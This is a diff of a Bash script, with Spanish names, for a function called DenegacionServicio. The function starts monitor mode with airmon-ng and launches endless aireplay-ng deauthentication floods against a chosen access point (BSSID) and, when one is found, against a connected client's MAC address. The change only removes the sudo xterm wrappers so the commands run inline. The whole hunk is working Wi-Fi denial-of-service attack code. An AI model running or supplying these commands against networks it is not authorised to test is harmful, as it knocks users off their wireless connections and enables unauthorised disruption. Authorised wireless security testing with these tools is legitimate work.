@@ -13,15 +13,15 @@ DenegacionServicio (){
 	sleep 5
 
 	X1="airmon-ng start $TARJETA_MODO_MONITOR $CANAL"
-	sudo xterm -hold -e "airmon-ng start $TARJETA_MODO_MONITOR $CANAL" &
+	airmon-ng start $TARJETA_MODO_MONITOR $CANAL
 	sleep 2
 	X2="aireplay-ng -0 0 -a $BSSID $TARJETA_MODO_MONITOR"
-	sudo xterm -hold -e "aireplay-ng -0 0 -a $BSSID $TARJETA_MODO_MONITOR" &
+	aireplay-ng -0 0 -a $BSSID $TARJETA_MODO_MONITOR
 
 	#SI hay cliente conectado
 	BuscarClienteConectado $BSSID
 	X3="aireplay-ng -0 0 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR"
-	sudo xterm -hold -e "aireplay-ng -0 0 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR" &
+	aireplay-ng -0 0 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR
 
 	TIEMPO_ESCANEO="120"
 	for A in `seq 1 $TIEMPO_ESCANEO` 
